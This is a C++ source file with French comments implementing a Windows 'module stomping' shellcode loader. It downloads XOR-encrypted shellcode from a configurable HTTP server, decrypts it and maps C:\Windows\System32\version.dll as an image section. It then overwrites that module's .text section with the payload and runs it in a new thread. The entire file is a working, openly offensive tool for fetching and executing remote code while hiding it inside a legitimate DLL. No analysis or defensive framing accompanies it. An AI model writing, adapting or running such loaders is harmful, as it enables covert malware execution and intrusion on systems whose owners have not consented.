#include <windows.h>
#include <winternl.h>
#include <winhttp.h>
#include <iostream>
#include <iomanip>
#include <vector>
#include <string>
#include <sstream>
#include <memory>
#include <chrono>
#include <thread>
#include <stdexcept>

// Définitions pour MinGW
#ifndef SEC_IMAGE
#define SEC_IMAGE 0x1000000
#endif

#ifndef ViewUnmap
#define ViewUnmap 2
#endif

// Configuration globale
namespace Config {
    constexpr uint8_t XOR_KEY = 0xAA;
    constexpr const wchar_t* USER_AGENT = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
    constexpr const wchar_t* DEFAULT_SERVER = L"127.0.0.1";
    constexpr INTERNET_PORT DEFAULT_PORT = 5000;
    constexpr const wchar_t* DEFAULT_PATH = L"/get_shellcode";
    constexpr const char* DEFAULT_DLL = "C:\\Windows\\System32\\version.dll";
    constexpr DWORD TIMEOUT_MS = 30000;
}

// Définition des fonctions NTAPI
extern "C" {
    typedef NTSTATUS (NTAPI *NtCreateSectionType)(
        PHANDLE SectionHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        PLARGE_INTEGER MaximumSize,
        ULONG SectionPageProtection,
        ULONG AllocationAttributes,
        HANDLE FileHandle
    );

    typedef NTSTATUS (NTAPI *NtMapViewOfSectionType)(
        HANDLE SectionHandle,
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        SIZE_T CommitSize,
        PLARGE_INTEGER SectionOffset,
        PSIZE_T ViewSize,
        DWORD InheritDisposition,
        ULONG AllocationType,
        ULONG Win32Protect
    );

    typedef NTSTATUS (NTAPI *NtProtectVirtualMemoryType)(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        PSIZE_T RegionSize,
        ULONG NewProtect,
        PULONG OldProtect
    );
}

// Classe Logger améliorée avec support UTF-8
class Logger {
public:
    enum Level { DEBUG, INFO, WARNING, ERROR };
    
    static void log(Level level, const std::string& message) {
        auto now = std::chrono::system_clock::now();
        auto now_c = std::chrono::system_clock::to_time_t(now);
        std::tm tm;
        localtime_s(&tm, &now_c);

        const char* level_str[] = {"[DEBUG]", "[INFO]", "[WARN]", "[ERROR]"};
        
        // Configuration de la sortie en UTF-8
        SetConsoleOutputCP(CP_UTF8);
        
        std::cout << std::put_time(&tm, "%Y-%m-%d %H:%M:%S") 
                 << " " << level_str[level] << " " << message << std::endl;
    }

    static void hexdump(const void* data, size_t size) {
        const uint8_t* p = static_cast<const uint8_t*>(data);
        std::stringstream ss;
        ss << "\nHexdump (" << size << " bytes):\n";
        
        for (size_t i = 0; i < size; i += 16) {
            ss << std::setw(4) << std::setfill('0') << std::hex << i << ": ";
            
            for (size_t j = 0; j < 16; j++) {
                if (i + j < size)
                    ss << std::setw(2) << std::setfill('0') << std::hex 
                       << static_cast<int>(p[i + j]) << " ";
                else
                    ss << "   ";
            }
            
            ss << " | ";
            for (size_t j = 0; j < 16 && i + j < size; j++) {
                char c = static_cast<char>(p[i + j]);
                ss << (c >= 32 && c <= 126 ? c : '.');
            }
            ss << "\n";
        }
        log(DEBUG, ss.str());
    }
};

// Gestionnaire d'erreurs Windows adapté
class WindowsErrorHandler {
public:
    static std::string getLastErrorMessage() {
        DWORD error = GetLastError();
        LPSTR messageBuffer = nullptr;
        
        size_t size = FormatMessageA(
            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
            nullptr,
            error,
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPSTR)&messageBuffer,
            0,
            nullptr
        );

        std::string message = "Code d'erreur 0x" + 
                             std::to_string(error) + ": " +
                             (messageBuffer ? std::string(messageBuffer, size) : "Message inconnu");
        
        if (messageBuffer) LocalFree(messageBuffer);
        return message;
    }

    static void logLastError(const char* context) {
        Logger::log(Logger::ERROR, std::string(context) + ": " + getLastErrorMessage());
    }
};

// Chargeur de fonctions NT amélioré
class NtLoader {
private:
    HMODULE ntdll;
    NtCreateSectionType NtCreateSection;
    NtMapViewOfSectionType NtMapViewOfSection;
    NtProtectVirtualMemoryType NtProtectVirtualMemory;

public:
    NtLoader() : ntdll(nullptr) {
        ntdll = GetModuleHandleA("ntdll.dll");
        if (!ntdll) {
            throw std::runtime_error("Impossible de charger ntdll.dll");
        }

        NtCreateSection = reinterpret_cast<NtCreateSectionType>(
            GetProcAddress(ntdll, "NtCreateSection")
        );
        NtMapViewOfSection = reinterpret_cast<NtMapViewOfSectionType>(
            GetProcAddress(ntdll, "NtMapViewOfSection")
        );
        NtProtectVirtualMemory = reinterpret_cast<NtProtectVirtualMemoryType>(
            GetProcAddress(ntdll, "NtProtectVirtualMemory")
        );

        if (!NtCreateSection || !NtMapViewOfSection || !NtProtectVirtualMemory) {
            throw std::runtime_error("Impossible de résoudre les fonctions NT");
        }
    }

    NtCreateSectionType getNtCreateSection() const { return NtCreateSection; }
    NtMapViewOfSectionType getNtMapViewOfSection() const { return NtMapViewOfSection; }
    NtProtectVirtualMemoryType getNtProtectVirtualMemory() const { return NtProtectVirtualMemory; }
};

// Gestionnaire RAII pour les handles Windows
template<typename T>
class ScopedHandle {
    T handle;

public:
    explicit ScopedHandle(T h = nullptr) : handle(h) {}
    ~ScopedHandle() {
        if (isValid()) {
            if (std::is_same_v<T, HANDLE>)
                CloseHandle(handle);
            else if (std::is_same_v<T, HINTERNET>)
                WinHttpCloseHandle(handle);
        }
    }

    bool isValid() const {
        return handle != nullptr && handle != INVALID_HANDLE_VALUE;
    }

    T get() const { return handle; }
    T* address() { return &handle; }

    ScopedHandle(const ScopedHandle&) = delete;
    ScopedHandle& operator=(const ScopedHandle&) = delete;
};

// Récupération du shellcode via HTTP
class ShellcodeFetcher {
public:
    static bool fetch(const std::wstring& server, INTERNET_PORT port,
                     const std::wstring& path, std::vector<uint8_t>& data) {
        Logger::log(Logger::INFO, "Connexion au serveur...");
        
        ScopedHandle<HINTERNET> session(
            WinHttpOpen(Config::USER_AGENT, 
                       WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                       WINHTTP_NO_PROXY_NAME, 
                       WINHTTP_NO_PROXY_BYPASS, 0)
        );
        
        if (!session.isValid()) {
            WindowsErrorHandler::logLastError("WinHttpOpen");
            return false;
        }

        // Configuration du timeout
        WinHttpSetTimeouts(session.get(), 0, Config::TIMEOUT_MS,
                          Config::TIMEOUT_MS, Config::TIMEOUT_MS);

        ScopedHandle<HINTERNET> connection(
            WinHttpConnect(session.get(), server.c_str(), port, 0)
        );
        
        if (!connection.isValid()) {
            WindowsErrorHandler::logLastError("WinHttpConnect");
            return false;
        }

        ScopedHandle<HINTERNET> request(
            WinHttpOpenRequest(connection.get(), L"GET", path.c_str(),
                             nullptr, WINHTTP_NO_REFERER,
                             WINHTTP_DEFAULT_ACCEPT_TYPES,
                             WINHTTP_FLAG_SECURE)
        );
        
        if (!request.isValid()) {
            WindowsErrorHandler::logLastError("WinHttpOpenRequest");
            return false;
        }

        if (!WinHttpSendRequest(request.get(), WINHTTP_NO_ADDITIONAL_HEADERS,
                               0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
            !WinHttpReceiveResponse(request.get(), nullptr)) {
            WindowsErrorHandler::logLastError("WinHttpSendRequest/ReceiveResponse");
            return false;
        }

        data.clear();
        DWORD bytesAvailable;
        while (WinHttpQueryDataAvailable(request.get(), &bytesAvailable) && 
               bytesAvailable > 0) {
            std::vector<uint8_t> buffer(bytesAvailable);
            DWORD bytesRead;
            
            if (WinHttpReadData(request.get(), buffer.data(),
                               bytesAvailable, &bytesRead)) {
                data.insert(data.end(), buffer.begin(),
                          buffer.begin() + bytesRead);
            } else {
                WindowsErrorHandler::logLastError("WinHttpReadData");
                return false;
            }
        }

        Logger::log(Logger::INFO, "Données reçues: " + 
                   std::to_string(data.size()) + " octets");
        return true;
    }
};

// Déchiffrement du shellcode
class ShellcodeDecryptor {
public:
    static bool decrypt(const std::vector<uint8_t>& input,
                       std::vector<uint8_t>& output) {
        Logger::log(Logger::INFO, "Déchiffrement du shellcode...");
        output.resize(input.size());
        
        for (size_t i = 0; i < input.size(); ++i) {
            output[i] = input[i] ^ Config::XOR_KEY;
        }
        
        Logger::log(Logger::INFO, "Shellcode déchiffré");
        return true;
    }
};

// Classe principale d'injection
class ModuleStomper {
public:
    static bool execute(const std::string& libraryPath,
                       const std::vector<uint8_t>& shellcode) {
        try {
            Logger::log(Logger::INFO, "Initialisation de l'injection...");
            
            // Chargement des fonctions NT
            NtLoader ntApi;
            
            // Ouverture de la DLL cible
            ScopedHandle<HANDLE> hFile(
                CreateFileW(std::wstring(libraryPath.begin(), libraryPath.end()).c_str(),
                          GENERIC_READ, FILE_SHARE_READ, nullptr,
                          OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr)
            );
            
            if (!hFile.isValid()) {
                WindowsErrorHandler::logLastError("CreateFileW");
                return false;
            }

            // Création de la section
            LARGE_INTEGER maxSize{};
            maxSize.QuadPart = GetFileSize(hFile.get(), nullptr);
            ScopedHandle<HANDLE> hSection;
            
            NTSTATUS status = ntApi.getNtCreateSection()(
                hSection.address(),
                SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
                nullptr, &maxSize, PAGE_READONLY, SEC_IMAGE, hFile.get()
            );
            
            if (status != 0) {
                Logger::log(Logger::ERROR, "NtCreateSection a échoué: " + 
                           std::to_string(status));
                return false;
            }

            // Mapping de la section
            PVOID baseAddress = nullptr;
            SIZE_T viewSize = static_cast<SIZE_T>(maxSize.QuadPart);
            
            status = ntApi.getNtMapViewOfSection()(
                hSection.get(), GetCurrentProcess(), &baseAddress,
                0, 0, nullptr, &viewSize, ViewUnmap, 0, PAGE_READWRITE
            );
            
            if (status != 0) {
                Logger::log(Logger::ERROR, "NtMapViewOfSection a échoué: " + 
                           std::to_string(status));
                return false;
            }

            // Analyse des en-têtes PE
            auto dosHeader = static_cast<PIMAGE_DOS_HEADER>(baseAddress);
            auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
                static_cast<PBYTE>(baseAddress) + dosHeader->e_lfanew
            );

            // Recherche de la section .text
            auto sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
            PVOID textSectionAddress = nullptr;
            SIZE_T textSize = 0;

            for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
                char sectionName[IMAGE_SIZEOF_SHORT_NAME + 1] = {0};
                memcpy(sectionName, sectionHeader->Name, IMAGE_SIZEOF_SHORT_NAME);
                
                Logger::log(Logger::DEBUG, "Analyse section: " + std::string(sectionName));
                
                if (strncmp(sectionName, ".text", 5) == 0) {
                    textSectionAddress = static_cast<PBYTE>(baseAddress) + 
                                       sectionHeader->VirtualAddress;
                    textSize = sectionHeader->Misc.VirtualSize;
                    Logger::log(Logger::INFO, "Section .text trouvée - Taille: " + 
                               std::to_string(textSize));
                    break;
                }
                sectionHeader++;
            }

            if (!textSectionAddress || textSize < shellcode.size()) {
                Logger::log(Logger::ERROR, 
                    "Section .text invalide ou trop petite pour le shellcode (" +
                    std::to_string(shellcode.size()) + " octets requis)");
                return false;
            }

            // Modification des permissions pour l'écriture
            ULONG oldProtect;
            SIZE_T shellcodeSize = shellcode.size();
            PVOID writeAddress = textSectionAddress;  // Copie nécessaire car modifiée par NtProtectVirtualMemory
            
            status = ntApi.getNtProtectVirtualMemory()(
                GetCurrentProcess(),
                &writeAddress,
                &shellcodeSize,
                PAGE_READWRITE,
                &oldProtect
            );
            
            if (status != 0) {
                Logger::log(Logger::ERROR, 
                    "Échec du changement de protection mémoire (RW): " + 
                    std::to_string(status));
                return false;
            }

            // Injection du shellcode
            Logger::log(Logger::INFO, "Injection du shellcode...");
            Logger::log(Logger::DEBUG, "Adresse d'injection: " + 
                       std::to_string(reinterpret_cast<uintptr_t>(textSectionAddress)));
            
            memcpy(textSectionAddress, shellcode.data(), shellcode.size());
            
            // Vérification de l'injection
            if (memcmp(textSectionAddress, shellcode.data(), shellcode.size()) != 0) {
                Logger::log(Logger::ERROR, "Erreur de vérification après injection");
                return false;
            }

            // Restauration des permissions pour exécution
            writeAddress = textSectionAddress;  // Reset car modifiée précédemment
            shellcodeSize = shellcode.size();   // Reset car modifiée précédemment
            
            status = ntApi.getNtProtectVirtualMemory()(
                GetCurrentProcess(),
                &writeAddress,
                &shellcodeSize,
                PAGE_EXECUTE_READ,
                &oldProtect
            );
            
            if (status != 0) {
                Logger::log(Logger::ERROR, 
                    "Échec du changement de protection mémoire (RX): " + 
                    std::to_string(status));
                return false;
            }

            // Création et exécution du thread
            Logger::log(Logger::INFO, "Création du thread d'exécution...");
            
            ScopedHandle<HANDLE> hThread(
                CreateThread(nullptr, 0,
                    reinterpret_cast<LPTHREAD_START_ROUTINE>(textSectionAddress),
                    nullptr, 0, nullptr)
            );
            
            if (!hThread.isValid()) {
                WindowsErrorHandler::logLastError("CreateThread");
                return false;
            }

            Logger::log(Logger::INFO, "Attente de la fin d'exécution...");
            
            // Attente avec timeout
            DWORD waitResult = WaitForSingleObject(hThread.get(), Config::TIMEOUT_MS);
            if (waitResult != WAIT_OBJECT_0) {
                if (waitResult == WAIT_TIMEOUT) {
                    Logger::log(Logger::ERROR, "Timeout d'exécution dépassé");
                } else {
                    WindowsErrorHandler::logLastError("WaitForSingleObject");
                }
                return false;
            }

            // Vérification du code de sortie
            DWORD exitCode = 0;
            if (GetExitCodeThread(hThread.get(), &exitCode)) {
                Logger::log(Logger::INFO, 
                    "Thread terminé avec le code: 0x" + 
                    std::to_string(exitCode));
            }

            Logger::log(Logger::INFO, "Injection terminée avec succès");
            return true;

        } catch (const std::exception& e) {
            Logger::log(Logger::ERROR, "Exception: " + std::string(e.what()));
            return false;
        } catch (...) {
            Logger::log(Logger::ERROR, "Exception inconnue");
            return false;
        }
    }
};

// Point d'entrée principal
int main(int argc, char* argv[]) {
    try {
        // Configuration de la console pour UTF-8
        SetConsoleOutputCP(CP_UTF8);
        SetConsoleCP(CP_UTF8);

        std::cout << "\n=== Module Stomping Loader (MinGW Edition) ===\n" << std::endl;

        // Configuration par défaut
        std::string libraryPath = Config::DEFAULT_DLL;
        std::wstring server = Config::DEFAULT_SERVER;
        INTERNET_PORT port = Config::DEFAULT_PORT;
        std::wstring path = Config::DEFAULT_PATH;

        // Traitement des arguments
        for (int i = 1; i < argc; i++) {
            std::string arg = argv[i];
            if (arg == "-dll" && i + 1 < argc) {
                libraryPath = argv[++i];
            } else if (arg == "-server" && i + 1 < argc) {
                std::string srv = argv[++i];
                server = std::wstring(srv.begin(), srv.end());
            } else if (arg == "-port" && i + 1 < argc) {
                port = static_cast<INTERNET_PORT>(std::stoi(argv[++i]));
            } else if (arg == "-path" && i + 1 < argc) {
                std::string p = argv[++i];
                path = std::wstring(p.begin(), p.end());
            } else if (arg == "-h" || arg == "--help") {
                std::cout << "Usage: " << argv[0] << " [options]\n"
                         << "Options:\n"
                         << "  -dll <path>     Chemin de la DLL\n"
                         << "  -server <host>  Serveur HTTP\n"
                         << "  -port <port>    Port du serveur\n"
                         << "  -path <path>    Chemin de l'endpoint\n"
                         << "  -h, --help      Affiche cette aide\n";
                return 0;
            }
        }

        // Affichage de la configuration
        Logger::log(Logger::INFO, "Configuration:");
        Logger::log(Logger::INFO, "  DLL: " + libraryPath);
        Logger::log(Logger::INFO, "  Serveur: " + 
                   std::string(server.begin(), server.end()) + ":" + 
                   std::to_string(port));

        // Récupération du shellcode
        std::vector<uint8_t> encryptedShellcode;
        if (!ShellcodeFetcher::fetch(server, port, path, encryptedShellcode)) {
            Logger::log(Logger::ERROR, "Échec de la récupération du shellcode");
            return 1;
        }

        // Déchiffrement
        std::vector<uint8_t> shellcode;
        if (!ShellcodeDecryptor::decrypt(encryptedShellcode, shellcode)) {
            Logger::log(Logger::ERROR, "Échec du déchiffrement");
            return 1;
        }

        // Injection et exécution
        if (!ModuleStomper::execute(libraryPath, shellcode)) {
            Logger::log(Logger::ERROR, "Échec de l'injection");
            return 1;
        }

        return 0;

    } catch (const std::exception& e) {
        Logger::log(Logger::ERROR, "Exception fatale: " + std::string(e.what()));
        return 1;
    } catch (...) {
        Logger::log(Logger::ERROR, "Exception inconnue");
        return 1;
    }
}